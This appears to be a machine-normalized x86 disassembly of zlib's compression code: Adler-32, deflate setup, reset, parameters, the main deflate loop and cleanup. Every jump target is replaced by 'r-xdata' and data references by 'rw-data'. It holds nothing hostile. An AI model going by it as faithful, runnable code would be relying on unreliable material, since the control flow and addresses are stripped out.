lea eax [ esp + 0x8044 ]
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] 0x8000
mov eax esi
xor edx edx
call sub_469b90
call sub_467714
mov ebx 0x8000
sub ebx [ esi + 0x10 ]
lea edx [ esp + 0x8044 ]
mov ecx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x0
jle r-xdata
mov eax esi
call sub_46aa4c
call sub_467714
add esp 0x10044
pop edi
pop esi
pop ebx
retn
lea edx [ esp + 0x44 ]
mov ecx 0x8000
mov eax [ esp ]
mov ebx [ eax ]
call [ ebx + 0xc ]
mov [ esp + 0x8 ] eax
cmp [ esp + 0x8 ] 0x0
jg r-xdata
sub_46797c
push ebx
push esi
mov ebx eax
push edi
mov edi ebx
push ebp
shr edi 0x10
mov ebp ecx
and edi 0xffff
and ebx 0xffff
cmp ebp 0x1
mov esi edx
jne r-xdata
test esi esi
jne r-xdata
xor eax eax
mov al [ esi ]
add ebx eax
cmp ebx 0xfff1
jb r-xdata
cmp ebp 0x10
jae r-xdata
mov eax 0x1
jmp r-xdata
add edi ebx
cmp edi 0xfff1
jb r-xdata
sub ebx 0xfff1
cmp ebp 0x15b0
jb r-xdata
jmp r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax edi
shl eax 0x10
or eax ebx
jmp r-xdata
sub edi 0xfff1
test ebp ebp
je r-xdata
sub ebp 0x15b0
mov eax 0x15b
mov ecx ebp
add ebp 0xffffffff
test ecx ecx
jne r-xdata
mov eax edi
shl eax 0x10
or eax ebx
cmp ebp 0x10
jb r-xdata
xor edx edx
mov dl [ esi ]
add ebx edx
add edi ebx
xor ecx ecx
mov cl [ esi + 0x1 ]
add ebx ecx
add edi ebx
xor edx edx
mov dl [ esi + 0x2 ]
add ebx edx
add edi ebx
xor ecx ecx
mov cl [ esi + 0x3 ]
add ebx ecx
add edi ebx
xor edx edx
mov dl [ esi + 0x4 ]
add ebx edx
add edi ebx
xor ecx ecx
mov cl [ esi + 0x5 ]
add ebx ecx
add edi ebx
xor edx edx
mov dl [ esi + 0x6 ]
add ebx edx
add edi ebx
xor ecx ecx
mov cl [ esi + 0x7 ]
add ebx ecx
add edi ebx
xor edx edx
mov dl [ esi + 0x8 ]
add ebx edx
add edi ebx
xor ecx ecx
mov cl [ esi + 0x9 ]
add ebx ecx
add edi ebx
xor edx edx
mov dl [ esi + 0xa ]
add ebx edx
add edi ebx
xor ecx ecx
mov cl [ esi + 0xb ]
add ebx ecx
add edi ebx
xor edx edx
mov dl [ esi + 0xc ]
add ebx edx
add edi ebx
xor ecx ecx
mov cl [ esi + 0xd ]
add ebx ecx
add edi ebx
xor edx edx
mov dl [ esi + 0xe ]
add ebx edx
add edi ebx
xor ecx ecx
mov cl [ esi + 0xf ]
add ebx ecx
add edi ebx
add esi 0x10
dec eax
jne r-xdata
mov ecx 0xfff1
mov eax ebx
xor edx edx
div ecx
mov ebx edx
mov ecx 0xfff1
mov eax edi
xor edx edx
div ecx
mov edi edx
cmp ebp 0x15b0
jae r-xdata
xor edx edx
mov dl [ esi ]
add ebx edx
inc esi
add edi ebx
cmp ebx 0xfff1
jb r-xdata
mov ecx ebp
add ebp 0xffffffff
test ecx ecx
jne r-xdata
sub ebp 0x10
xor eax eax
mov al [ esi ]
add ebx eax
add edi ebx
xor edx edx
mov dl [ esi + 0x1 ]
add ebx edx
add edi ebx
xor ecx ecx
mov cl [ esi + 0x2 ]
add ebx ecx
add edi ebx
xor eax eax
mov al [ esi + 0x3 ]
add ebx eax
add edi ebx
xor edx edx
mov dl [ esi + 0x4 ]
add ebx edx
add edi ebx
xor ecx ecx
mov cl [ esi + 0x5 ]
add ebx ecx
add edi ebx
xor eax eax
mov al [ esi + 0x6 ]
add ebx eax
add edi ebx
xor edx edx
mov dl [ esi + 0x7 ]
add ebx edx
add edi ebx
xor ecx ecx
mov cl [ esi + 0x8 ]
add ebx ecx
add edi ebx
xor eax eax
mov al [ esi + 0x9 ]
add ebx eax
add edi ebx
xor edx edx
mov dl [ esi + 0xa ]
add ebx edx
add edi ebx
xor ecx ecx
mov cl [ esi + 0xb ]
add ebx ecx
add edi ebx
xor eax eax
mov al [ esi + 0xc ]
add ebx eax
add edi ebx
xor edx edx
mov dl [ esi + 0xd ]
add ebx edx
add edi ebx
xor ecx ecx
mov cl [ esi + 0xe ]
add ebx ecx
add edi ebx
xor eax eax
mov al [ esi + 0xf ]
add ebx eax
add edi ebx
add esi 0x10
cmp ebp 0x10
jae r-xdata
mov ecx 0xfff1
mov eax edi
xor edx edx
div ecx
mov edi edx
mov eax edi
shl eax 0x10
or eax ebx
jmp r-xdata
sub ebx 0xfff1
xor edx edx
mov dl [ esi ]
add ebx edx
inc esi
add edi ebx
mov ecx 0xfff1
mov eax ebx
xor edx edx
div ecx
mov ebx edx
mov ecx 0xfff1
mov eax edi
xor edx edx
div ecx
mov edi edx
jmp r-xdata
sub_467bdc
push ebx
push esi
push edi
push ebp
push ecx
mov ebp eax
mov [ esp ] edx
mov eax ecx
xor edx edx
mov ecx 0xfff1
div ecx
mov edi edx
mov ebx ebp
and ebx 0xffff
mov esi edi
imul esi ebx
mov eax esi
xor edx edx
mov ecx 0xfff1
div ecx
mov esi edx
mov edx [ esp ]
shr edx 0x10
mov eax [ esp ]
shr ebp 0x10
and edx 0xffff
and ebp 0xffff
and eax 0xffff
add ebp edx
add eax 0xfff1
add ebp 0xfff1
dec eax
sub ebp edi
add ebx eax
add esi ebp
cmp ebx 0xfff1
jbe r-xdata
cmp ebx 0xfff1
jbe r-xdata
sub ebx 0xfff1
cmp esi 0x1ffe2
jbe r-xdata
sub ebx 0xfff1
cmp esi 0xfff1
jbe r-xdata
sub esi 0x1ffe2
mov eax esi
shl eax 0x10
or eax ebx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub esi 0xfff1
sub_467ca0
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov esi eax
mov eax [ ebp + 0xc ]
mov [ ebp - 0xc ] 0x1
test eax eax
je r-xdata
mov eax 0xfffffffa
jmp r-xdata
mov al [ eax ]
cmp al [ rw-data ]
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x14
cmp [ ebp + 0x8 ] 0x38
je r-xdata
test esi esi
jne r-xdata
xor edx edx
mov [ esi + 0x18 ] edx
cmp [ esi + 0x20 ] 0x0
jne r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ esi + 0x24 ] 0x0
jne r-xdata
mov [ esi + 0x20 ] r-xdata
xor ecx ecx
mov [ esi + 0x28 ] ecx
cmp [ ebp - 0x4 ] 0xffffffff
jne r-xdata
mov [ esi + 0x24 ] sub_4676b4
cmp [ ebp + 0x18 ] 0x0
jge r-xdata
mov [ ebp - 0x4 ] 0x6
cmp [ ebp + 0x14 ] 0x1
jl r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
neg [ ebp + 0x18 ]
mov eax 0xfffffffe
jmp r-xdata
cmp [ ebp + 0x14 ] 0x9
jg r-xdata
cmp [ ebp - 0x8 ] 0x8
jne r-xdata
cmp [ ebp + 0x18 ] 0x8
jl r-xdata
cmp [ ebp + 0x18 ] 0xf
jg r-xdata
cmp [ ebp - 0x4 ] 0x0
jl r-xdata
cmp [ ebp - 0x4 ] 0x9
jg r-xdata
cmp [ ebp + 0x10 ] 0x0
jl r-xdata
cmp [ ebp + 0x10 ] 0x4
jle r-xdata
cmp [ ebp + 0x18 ] 0x8
jne r-xdata
mov ecx 0x16bc
mov edx 0x1
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov ebx eax
test ebx ebx
jne r-xdata
mov [ ebp + 0x18 ] 0x9
mov [ esi + 0x1c ] ebx
mov [ ebx ] esi
mov edx [ ebp - 0xc ]
mov [ ebx + 0x18 ] edx
mov edx 0x1
mov eax [ ebp + 0x18 ]
mov ecx eax
mov [ ebx + 0x2c ] eax
shl edx cl
mov [ ebx + 0x28 ] edx
dec edx
mov [ ebx + 0x30 ] edx
mov edx 0x1
mov eax [ ebp + 0x14 ]
add eax 0x7
mov ecx eax
mov [ ebx + 0x4c ] eax
shl edx cl
mov [ ebx + 0x48 ] edx
dec edx
mov [ ebx + 0x50 ] edx
xor edx edx
mov eax [ ebx + 0x4c ]
mov ecx 0x3
add eax 0x3
dec eax
div ecx
mov [ ebx + 0x54 ] eax
mov ecx 0x2
mov eax [ esi + 0x28 ]
mov edx [ ebx + 0x28 ]
call [ esi + 0x20 ]
mov [ ebx + 0x34 ] eax
mov ecx 0x2
mov edx [ ebx + 0x28 ]
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov [ ebx + 0x3c ] eax
mov ecx 0x2
mov edx [ ebx + 0x48 ]
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov [ ebx + 0x40 ] eax
mov ecx [ ebp + 0x14 ]
add ecx 0x6
mov eax 0x1
shl eax cl
mov [ ebx + 0x1698 ] eax
mov ecx 0x4
mov edx eax
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov [ ebx + 0x8 ] eax
mov edx [ ebx + 0x1698 ]
shl edx 0x2
mov [ ebx + 0xc ] edx
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax 0xfffffffc
jmp r-xdata
mov [ ebx + 0x4 ] 0x29a
mov eax [ rw-data ]
mov [ esi + 0x18 ] eax
mov eax esi
call sub_468504
mov eax 0xfffffffc
jmp r-xdata
cmp [ ebx + 0x3c ] 0x0
je r-xdata
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx [ ebx + 0x1698 ]
shr edx 0x1
add edx edx
add eax edx
mov [ ebx + 0x16a0 ] eax
mov ecx [ ebx + 0x1698 ]
lea ecx [ ecx + ecx * 2 ]
add ecx [ ebx + 0x8 ]
mov [ ebx + 0x1694 ] ecx
mov eax [ ebp - 0x4 ]
mov [ ebx + 0x80 ] eax
mov eax esi
mov edx [ ebp + 0x10 ]
mov [ ebx + 0x84 ] edx
mov cl [ ebp - 0x8 ]
mov [ ebx + 0x20 ] cl
call sub_467fbc
sub_467ec4
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] ecx
mov ebp edx
mov edi eax
mov esi [ esp ]
test edi edi
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ edi + 0x1c ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
test ebp ebp
je r-xdata
mov eax [ edi + 0x1c ]
cmp [ eax + 0x18 ] 0x2
je r-xdata
mov eax [ edi + 0x1c ]
cmp [ eax + 0x18 ] 0x1
jne r-xdata
mov ebx [ edi + 0x1c ]
cmp [ ebx + 0x18 ] 0x0
je r-xdata
cmp [ eax + 0x4 ] 0x2a
je r-xdata
cmp esi 0x3
jae r-xdata
mov eax [ edi + 0x30 ]
mov ecx [ esp ]
mov edx ebp
call sub_46797c
mov [ edi + 0x30 ] eax
mov eax [ ebx + 0x28 ]
sub eax 0x106
cmp esi eax
jbe r-xdata
xor eax eax
jmp r-xdata
push esi
push ebp
mov edx [ ebx + 0x34 ]
push edx
call sub_4676d0
mov [ ebx + 0x68 ] esi
mov [ ebx + 0x58 ] esi
mov ecx [ ebx + 0x34 ]
xor eax eax
add esp 0xc
mov al [ ecx ]
mov [ ebx + 0x44 ] eax
mov edx [ ebx + 0x34 ]
mov ecx [ ebx + 0x54 ]
shl eax cl
movzx edx [ edx + 0x1 ]
xor eax edx
and eax [ ebx + 0x50 ]
mov [ ebx + 0x44 ] eax
xor eax eax
jmp r-xdata
mov esi eax
mov eax [ esp ]
sub eax esi
add ebp eax
mov edx esi
sub edx 0x3
cmp eax edx
jbe r-xdata
mov ecx [ ebx + 0x54 ]
mov edx [ ebx + 0x44 ]
shl edx cl
mov ecx [ ebx + 0x34 ]
movzx ecx [ ecx + eax + 0x2 ]
xor edx ecx
and edx [ ebx + 0x50 ]
mov [ ebx + 0x44 ] edx
mov ecx [ ebx + 0x40 ]
mov dx [ ecx + edx * 2 ]
mov ecx [ ebx + 0x30 ]
and ecx eax
mov edi [ ebx + 0x3c ]
mov [ edi + ecx * 2 ] dx
mov edx [ ebx + 0x40 ]
mov ecx [ ebx + 0x44 ]
mov [ edx + ecx * 2 ] ax
inc eax
xor eax eax
sub_467fbc
push ebx
push esi
mov esi eax
test esi esi
je r-xdata
mov eax 0xfffffffe
pop esi
pop ebx
retn
cmp [ esi + 0x1c ] 0x0
je r-xdata
cmp [ esi + 0x20 ] 0x0
je r-xdata
cmp [ esi + 0x24 ] 0x0
jne r-xdata
xor edx edx
xor eax eax
mov [ esi + 0x14 ] edx
mov [ esi + 0x8 ] edx
mov [ esi + 0x18 ] eax
xor eax eax
mov [ esi + 0x2c ] 0x2
mov ebx [ esi + 0x1c ]
mov [ ebx + 0x14 ] eax
mov edx [ ebx + 0x8 ]
mov [ ebx + 0x10 ] edx
mov eax [ ebx + 0x18 ]
test eax eax
jge r-xdata
cmp [ ebx + 0x18 ] 0x0
je r-xdata
neg eax
mov [ ebx + 0x18 ] eax
mov edx 0x71
mov edx 0x2a
jmp r-xdata
mov [ ebx + 0x4 ] edx
xor ecx ecx
xor edx edx
xor eax eax
call sub_46797c
mov [ esi + 0x30 ] eax
xor ecx ecx
mov [ ebx + 0x24 ] ecx
mov eax ebx
call sub_46b230
mov eax ebx
call sub_46879c
xor eax eax
pop esi
pop ebx
retn
sub_468048
push ebx
push esi
mov esi ecx
test eax eax
je r-xdata
mov eax 0xfffffffe
pop esi
pop ebx
retn
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov ebx [ eax + 0x1c ]
mov ecx edx
mov [ ebx + 0x16b8 ] edx
mov dx 0x1
shl dx cl
add dx 0xffff
and dx si
xor eax eax
mov [ ebx + 0x16b4 ] dx
pop esi
pop ebx
retn
sub_468084
push ebx
push esi
push edi
push ebp
push ecx
mov edi ecx
mov ebx edx
xor edx edx
test eax eax
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov esi [ eax + 0x1c ]
cmp ebx 0xffffffff
jne r-xdata
test ebx ebx
jl r-xdata
mov ebx 0x6
mov eax 0xfffffffe
jmp r-xdata
cmp ebx 0x9
jg r-xdata
test edi edi
jl r-xdata
cmp edi 0x4
jle r-xdata
mov ecx [ esi + 0x80 ]
lea ebp [ ebx + ebx * 2 ]
lea ecx [ ecx + ecx * 2 ]
mov ecx [ ecx * 4 + rw-data ]
mov [ esp ] ecx
mov ecx [ ebp * 4 + rw-data ]
cmp ecx [ esp ]
je r-xdata
cmp ebx [ esi + 0x80 ]
je r-xdata
cmp [ eax + 0x8 ] 0x0
je r-xdata
mov [ esi + 0x84 ] edi
mov eax edx
mov [ esi + 0x80 ] ebx
movzx eax [ ebp * 4 + rw-data ]
mov [ esi + 0x7c ] eax
movzx ecx [ ebp * 4 + rw-data ]
mov [ esi + 0x88 ] ecx
movzx eax [ ebp * 4 + rw-data ]
mov [ esi + 0x8c ] eax
movzx ecx [ ebp * 4 + rw-data ]
mov [ esi + 0x78 ] ecx
mov edx 0x1
call sub_468240
mov edx eax
sub_46814c
push ebp
mov ebp esp
test eax eax
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ eax + 0x1c ] 0x0
jne r-xdata
pop ebp
retn 0x8
mov eax [ eax + 0x1c ]
mov [ eax + 0x88 ] edx
mov [ eax + 0x7c ] ecx
mov edx [ ebp + 0xc ]
mov [ eax + 0x8c ] edx
mov ecx [ ebp + 0x8 ]
mov [ eax + 0x78 ] ecx
xor eax eax
sub_468184
push ebx
lea ecx [ edx + 0x7 ]
shr ecx 0x3
lea ebx [ edx + 0x3f ]
shr ebx 0x6
add ecx edx
add ecx ebx
add ecx 0xb
test eax eax
je r-xdata
mov eax ecx
pop ebx
retn
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ eax + 0x1c ]
cmp [ eax + 0x2c ] 0xf
jne r-xdata
mov eax ecx
pop ebx
retn
cmp [ eax + 0x4c ] 0xf
je r-xdata
mov eax edx
call sub_46d124
pop ebx
retn
sub_4681c4
push ebx
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov ebx [ eax + 0x8 ]
lea ecx [ ebx + ecx ]
push ecx
mov ecx edx
shr ecx 0x8
pop ebx
mov [ ebx ] cl
mov ecx [ eax + 0x14 ]
inc [ eax + 0x14 ]
mov eax [ eax + 0x8 ]
and dl 0xff
mov [ eax + ecx ] dl
pop ebx
retn
sub_4681ec
push ebx
mov ebx eax
push esi
mov eax [ ebx + 0x1c ]
mov edx [ ebx + 0x10 ]
mov esi [ eax + 0x14 ]
cmp esi edx
jbe r-xdata
test esi esi
je r-xdata
mov esi edx
pop esi
pop ebx
retn
push esi
mov eax [ eax + 0x10 ]
push eax
mov edx [ ebx + 0xc ]
push edx
call sub_4676d0
add esp 0xc
mov eax esi
add [ ebx + 0xc ] eax
mov edx [ ebx + 0x1c ]
add [ edx + 0x10 ] eax
add [ ebx + 0x14 ] esi
sub [ ebx + 0x10 ] esi
mov ecx [ ebx + 0x1c ]
sub [ ecx + 0x14 ] esi
mov eax [ ebx + 0x1c ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
mov edx [ eax + 0x8 ]
mov [ eax + 0x10 ] edx
sub_468240
push ebx
push esi
push edi
push ebp
push ecx
mov edi edx
mov esi eax
test esi esi
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
cmp [ esi + 0x1c ] 0x0
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
cmp edi 0x4
jg r-xdata
test edi edi
jge r-xdata
cmp [ esi + 0xc ] 0x0
mov ebx [ esi + 0x1c ]
je r-xdata
mov eax [ rw-data ]
mov [ esi + 0x18 ] eax
mov eax 0xfffffffe
jmp r-xdata
cmp [ esi ] 0x0
jne r-xdata
cmp [ ebx + 0x4 ] 0x29a
jne r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp edi 0x4
je r-xdata
mov [ ebx ] esi
mov ebp [ ebx + 0x24 ]
mov [ ebx + 0x24 ] edi
cmp [ ebx + 0x4 ] 0x2a
jne r-xdata
mov edx [ rw-data ]
mov eax 0xfffffffb
mov [ esi + 0x18 ] edx
jmp r-xdata
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov ecx [ ebx + 0x2c ]
sub ecx 0x8
shl ecx 0x4
add ecx 0x8
shl ecx 0x8
cmp [ ebx + 0x84 ] 0x2
jge r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
mov eax esi
call sub_4681ec
cmp [ esi + 0x10 ] 0x0
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ ebx + 0x80 ] 0x2
jge r-xdata
cmp [ ebx + 0x4 ] 0x29a
jne r-xdata
cmp ebp edi
jl r-xdata
mov [ ebx + 0x24 ] 0xffffffff
xor eax eax
jmp r-xdata
shl eax 0x6
or ecx eax
cmp [ ebx + 0x68 ] 0x0
je r-xdata
mov eax [ ebx + 0x80 ]
cmp eax 0x6
jge r-xdata
cmp [ esi + 0x4 ] 0x0
jne r-xdata
cmp [ esi + 0x4 ] 0x0
je r-xdata
cmp edi 0x4
je r-xdata
mov eax ecx
push ecx
xor edx edx
mov ecx 0x1f
div ecx
mov eax 0x1f
pop ecx
sub eax edx
add ecx eax
mov eax ebx
mov [ ebx + 0x4 ] 0x71
mov edx ecx
call sub_4681c4
cmp [ ebx + 0x68 ] 0x0
je r-xdata
or ecx 0x20
cmp eax 0x6
jne r-xdata
mov eax 0x1
jmp r-xdata
mov edx [ ebx + 0x80 ]
mov eax ebx
lea edx [ edx + edx * 2 ]
mov ebp [ edx * 4 + rw-data ]
mov edx edi
call ebp
mov [ esp ] eax
cmp [ esp ] 0x2
je r-xdata
cmp [ ebx + 0x70 ] 0x0
jne r-xdata
mov edx [ rw-data ]
mov eax 0xfffffffb
mov [ esi + 0x18 ] edx
jmp r-xdata
mov edx [ rw-data ]
mov eax 0xfffffffb
mov [ esi + 0x18 ] edx
jmp r-xdata
xor ecx ecx
xor edx edx
xor eax eax
call sub_46797c
mov [ esi + 0x30 ] eax
mov edx [ esi + 0x30 ]
mov eax ebx
shr edx 0x10
call sub_4681c4
mov edx [ esi + 0x30 ]
mov eax ebx
and edx 0xffff
call sub_4681c4
mov eax 0x3
mov eax 0x2
jmp r-xdata
mov [ ebx + 0x4 ] 0x29a
cmp [ esp ] 0x3
jne r-xdata
test edi edi
je r-xdata
cmp [ esi + 0x10 ] 0x0
jne r-xdata
cmp [ esp ] 0x2
jne r-xdata
cmp [ esp ] 0x0
je r-xdata
cmp edi 0x4
je r-xdata
cmp [ ebx + 0x4 ] 0x29a
je r-xdata
xor eax eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xffffffff
cmp [ esp ] 0x1
jne r-xdata
cmp [ ebx + 0x18 ] 0x0
jg r-xdata
xor eax eax
jmp r-xdata
cmp edi 0x1
jne r-xdata
mov edx [ esi + 0x30 ]
mov eax ebx
shr edx 0x10
call sub_4681c4
mov edx [ esi + 0x30 ]
mov eax ebx
and edx 0xffff
call sub_4681c4
mov eax esi
call sub_4681ec
mov eax [ ebx + 0x18 ]
test eax eax
jle r-xdata
mov eax 0x1
jmp r-xdata
push 0x0
xor ecx ecx
xor edx edx
mov eax ebx
call sub_46c370
cmp edi 0x3
jne r-xdata
mov eax ebx
call sub_46c42c
jmp r-xdata
cmp [ ebx + 0x14 ] 0x0
je r-xdata
neg eax
mov [ ebx + 0x18 ] eax
mov eax esi
call sub_4681ec
cmp [ esi + 0x10 ] 0x0
jne r-xdata
mov edx [ ebx + 0x40 ]
mov ecx [ ebx + 0x48 ]
mov [ edx + ecx * 2 - 0x2 ] 0x0
mov eax [ ebx + 0x48 ]
dec eax
add eax eax
push eax
push 0x0
mov edx [ ebx + 0x40 ]
push edx
call sub_4676bc
add esp 0xc
mov eax 0x1
xor eax eax
jmp r-xdata
mov [ ebx + 0x24 ] 0xffffffff
xor eax eax
jmp r-xdata
sub_468504
push ebx
push esi
mov ebx eax
test ebx ebx
je r-xdata
mov eax 0xfffffffe
pop esi
pop ebx
retn
cmp [ ebx + 0x1c ] 0x0
jne r-xdata
mov edx [ ebx + 0x1c ]
mov esi [ edx + 0x4 ]
cmp esi 0x2a
je r-xdata
mov edx [ ebx + 0x1c ]
mov eax [ edx + 0x8 ]
test eax eax
je r-xdata
cmp esi 0x45
je r-xdata
mov edx [ ebx + 0x1c ]
mov eax [ edx + 0x40 ]
test eax eax
je r-xdata
mov edx eax
mov eax [ ebx + 0x28 ]
call [ ebx + 0x24 ]
cmp esi 0x49
je r-xdata
mov edx [ ebx + 0x1c ]
mov eax [ edx + 0x3c ]
test eax eax
je r-xdata
mov edx eax
mov eax [ ebx + 0x28 ]
call [ ebx + 0x24 ]
cmp esi 0x5b
je r-xdata
mov edx [ ebx + 0x1c ]
mov eax [ edx + 0x34 ]
test eax eax
je r-xdata
mov edx eax
mov eax [ ebx + 0x28 ]
call [ ebx + 0x24 ]
cmp esi 0x67
je r-xdata
mov edx [ ebx + 0x1c ]
mov eax [ ebx + 0x28 ]
call [ ebx + 0x24 ]
xor edx edx
cmp esi 0x71
mov [ ebx + 0x1c ] edx
jne r-xdata
mov edx eax
mov eax [ ebx + 0x28 ]
call [ ebx + 0x24 ]
cmp esi 0x71
je r-xdata
xor eax eax
mov eax 0xfffffffd
jmp r-xdata
cmp esi 0x29a
je r-xdata
pop esi
pop ebx
retn
mov eax 0xfffffffe
pop esi
pop ebx
retn
sub_4685b8
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] edx
mov esi eax
cmp [ esp ] 0x0
je r-xdata
mov eax 0xfffffffe
jmp r-xdata
test esi esi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax [ esp ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov edx [ esp ]
mov edi [ edx + 0x1c ]
push 0x38
mov eax [ esp + 0x4 ]
push eax
push esi
call sub_4676d0
add esp 0xc
mov ecx 0x16bc
mov edx 0x1
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov ebx eax
test ebx ebx
jne r-xdata
mov [ esi + 0x1c ] ebx
push 0x16bc
push edi
push ebx
call sub_4676d0
add esp 0xc
mov [ ebx ] esi
mov ecx 0x2
mov edx [ ebx + 0x28 ]
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov [ ebx + 0x34 ] eax
mov ecx 0x2
mov edx [ ebx + 0x28 ]
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov [ ebx + 0x3c ] eax
mov ecx 0x2
mov edx [ ebx + 0x48 ]
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov [ ebx + 0x40 ] eax
mov ecx 0x4
mov edx [ ebx + 0x1698 ]
mov eax [ esi + 0x28 ]
call [ esi + 0x20 ]
mov ebp eax
mov [ ebx + 0x8 ] ebp
cmp [ ebx + 0x34 ] 0x0
je r-xdata
mov eax 0xfffffffc
jmp r-xdata
mov eax esi
call sub_468504
mov eax 0xfffffffc
jmp r-xdata
cmp [ ebx + 0x3c ] 0x0
je r-xdata
cmp [ ebx + 0x40 ] 0x0
je r-xdata
cmp [ ebx + 0x8 ] 0x0
jne r-xdata
mov edx [ ebx + 0x28 ]
add edx edx
push edx
mov ecx [ edi + 0x34 ]
push ecx
mov eax [ ebx + 0x34 ]
push eax
call sub_4676d0
add esp 0xc
mov edx [ ebx + 0x28 ]
add edx edx
push edx
mov ecx [ edi + 0x3c ]
push ecx
mov eax [ ebx + 0x3c ]
push eax
call sub_4676d0
add esp 0xc
mov edx [ ebx + 0x48 ]
add edx edx
push edx
mov ecx [ edi + 0x40 ]
push ecx
mov eax [ ebx + 0x40 ]
push eax
call sub_4676d0
add esp 0xc
mov edx [ ebx + 0xc ]
push edx
mov ecx [ edi + 0x8 ]
push ecx
mov eax [ ebx + 0x8 ]
push eax
call sub_4676d0
mov edx [ edi + 0x10 ]
add esp 0xc
sub edx [ edi + 0x8 ]
add edx [ ebx + 0x8 ]
mov [ ebx + 0x10 ] edx
lea edx [ ebx + 0x90 ]
mov ecx [ ebx + 0x1698 ]
shr ecx 0x1
add ecx ecx
add ebp ecx
lea ecx [ ebx + 0x984 ]
mov [ ebx + 0x16a0 ] ebp
mov eax [ ebx + 0x1698 ]
lea eax [ eax + eax * 2 ]
add eax [ ebx + 0x8 ]
mov [ ebx + 0x1694 ] eax
mov [ ebx + 0xb14 ] edx
lea eax [ ebx + 0xa78 ]
mov [ ebx + 0xb20 ] ecx
mov [ ebx + 0xb2c ] eax
xor eax eax
sub_468750
push ebx
push esi
mov esi eax
push edi
mov edi edx
mov ebx [ esi + 0x4 ]
cmp ecx ebx
jae r-xdata
test ebx ebx
jne r-xdata
mov ebx ecx
sub [ esi + 0x4 ] ebx
mov edx [ esi + 0x1c ]
cmp [ edx + 0x18 ] 0x1
jne r-xdata
xor eax eax
jmp r-xdata
push ebx
mov ecx [ esi ]
push ecx
push edi
call sub_4676d0
add esp 0xc
mov eax ebx
add [ esi ] eax
add [ esi + 0x8 ] ebx
mov ecx ebx
mov edx [ esi ]
mov eax [ esi + 0x30 ]
call sub_46797c
mov [ esi + 0x30 ] eax
pop edi
pop esi
pop ebx
retn
sub_46879c
push ebx
mov ebx eax
mov eax [ ebx + 0x28 ]
add eax eax
mov [ ebx + 0x38 ] eax
mov edx [ ebx + 0x40 ]
mov ecx [ ebx + 0x48 ]
mov [ edx + ecx * 2 - 0x2 ] 0x0
mov eax [ ebx + 0x48 ]
dec eax
add eax eax
push eax
push 0x0
mov edx [ ebx + 0x40 ]
push edx
call sub_4676bc
mov ecx [ ebx + 0x80 ]
add esp 0xc
lea ecx [ ecx + ecx * 2 ]
movzx eax [ ecx * 4 + rw-data ]
mov [ ebx + 0x7c ] eax
mov edx [ ebx + 0x80 ]
lea edx [ edx + edx * 2 ]
movzx ecx [ edx * 4 + rw-data ]
mov [ ebx + 0x88 ] ecx
mov eax [ ebx + 0x80 ]
lea eax [ eax + eax * 2 ]
movzx edx [ eax * 4 + rw-data ]
mov [ ebx + 0x8c ] edx
xor edx edx
mov ecx [ ebx + 0x80 ]
lea ecx [ ecx + ecx * 2 ]
movzx eax [ ecx * 4 + rw-data ]
mov [ ebx + 0x78 ] eax
mov [ ebx + 0x68 ] edx
xor ecx ecx
xor eax eax
mov [ ebx + 0x58 ] ecx
mov [ ebx + 0x70 ] eax
mov edx 0x2
xor eax eax
mov [ ebx + 0x74 ] edx
mov [ ebx + 0x5c ] edx
mov [ ebx + 0x64 ] eax
xor ecx ecx
mov [ ebx + 0x44 ] ecx
pop ebx
retn
sub_468848
push ebx
push esi
push edi
add esp 0xffffffe4
mov [ esp ] edx
mov edx [ eax + 0x78 ]
mov [ esp + 0x4 ] edx
mov edx [ eax + 0x68 ]
mov ecx [ eax + 0x34 ]
mov edi [ eax + 0x74 ]
mov ebx [ eax + 0x8c ]
mov [ esp + 0x8 ] ebx
add ecx edx
mov ebx [ eax + 0x28 ]
sub ebx 0x106
cmp edx ebx
jbe r-xdata
xor ebx ebx
mov edx [ eax + 0x28 ]
sub edx 0x106
mov ebx [ eax + 0x68 ]
sub ebx edx
jmp r-xdata
mov ebx [ eax + 0x70 ]
cmp ebx [ esp + 0x8 ]
jae r-xdata
shr [ esp + 0x4 ] 0x2
